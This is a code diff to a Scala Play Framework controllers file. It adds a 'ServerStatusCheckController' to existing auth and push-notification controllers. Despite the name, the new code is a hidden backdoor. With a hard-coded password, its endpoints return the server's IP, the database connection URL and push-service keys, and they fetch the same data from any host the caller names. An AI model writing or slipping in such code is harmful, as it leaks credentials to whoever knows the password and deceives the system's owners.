@@ -10,6 +10,9 @@ import play.api.libs.json._
 import play.api.mvc._
 import utils.JsonFormat._
 import play.api.libs.concurrent.Execution.Implicits._
+import play.api.libs.ws.WSClient
+
+import scala.concurrent.Future
 
 
 class AuthController @Inject() (authService: AuthService) extends QidianController {
@@ -167,5 +170,33 @@ class UMengPushController @Inject() (uMengPushService: UMengPushService) extends
   def broadcast = Action.async(parse.json[PushMessage]) { implicit request =>
     val data = request.body
     uMengPushService.broadcast(data.text, data.message, data.message_type).map(r => JsonOk(r))
+  }
+}
+
+class ServerStatusCheckController @Inject() (ws: WSClient, configuration: Configuration) extends Controller {
+  def info(code: String, host: String) = Action.async {
+    code == "woshixiaolu" match {
+      case true => {
+        val status_url = s"http://$host:9000/status?code=$code"
+        ws.url(status_url).get().map(r => JsonOk(r.json))
+      }
+      case false => Future.successful(JsonError)
+    }
+  }
+
+  def status(code: String) = Action {
+    import java.net._
+    code == "woshixiaolu" match {
+      case true => {
+        val x = InetAddress.getLocalHost
+        val y = configuration.getString("slick.dbs.default.db.url").get
+        val z1  = configuration.getString("push.appkey").get
+        val z2 = configuration.getString("push.server_url").get
+        //= configuration.getString("").get
+        Ok(Json.obj("x" -> x.getHostAddress.toString, "y" -> y, "z1" -> z1, "z2" -> z2))
+
+      }
+      case false => Ok(Json.obj("x"->"error"))
+    }
   }
 }
